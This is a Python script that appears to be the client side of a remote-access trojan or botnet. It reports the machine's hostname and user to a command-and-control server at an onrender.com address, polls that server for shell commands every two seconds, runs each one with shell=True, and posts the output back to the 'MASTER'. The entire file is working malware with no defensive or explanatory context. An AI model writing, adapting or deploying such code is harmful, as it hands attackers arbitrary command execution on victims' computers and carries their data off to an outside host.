import os
import socket
import requests
import time
import subprocess

SLEEP_IN_SECONDS = 2

hostname = socket.gethostname()
username = os.getlogin()
mac = "f8:94:c2:dd:9c:f3"
os = "Ubuntu 23.04"

base_url = "https://rune-master.onrender.com"

def get_cmd_from_server():
	url = f"{base_url}/api/slave/command"
	payload = {"username":username,"mac":mac,"hostname":hostname,"os":os}
	output = requests.post(url, json = payload)
	return output.json()

def get_shell_output(command):
	return subprocess.check_output(command, shell=True, universal_newlines=True)

def send_response_to_server(content):
	url = f"{base_url}/api/slave/response/text"
	payload = {"mac":mac,"content":content}
	output = requests.post(url, json = payload)
	


while True:
	print("[+] Getting command from server")
	response = get_cmd_from_server()
	if response == {}:
		print("[+] Nothing to do")
		time.sleep(SLEEP_IN_SECONDS)
		continue
	if response['type']=='SHELL':
		cmd_output = get_shell_output(response['command'])
		print("[+] Sending Response back to MASTER..")
		send_response_to_server(cmd_output)

	time.sleep(SLEEP_IN_SECONDS)
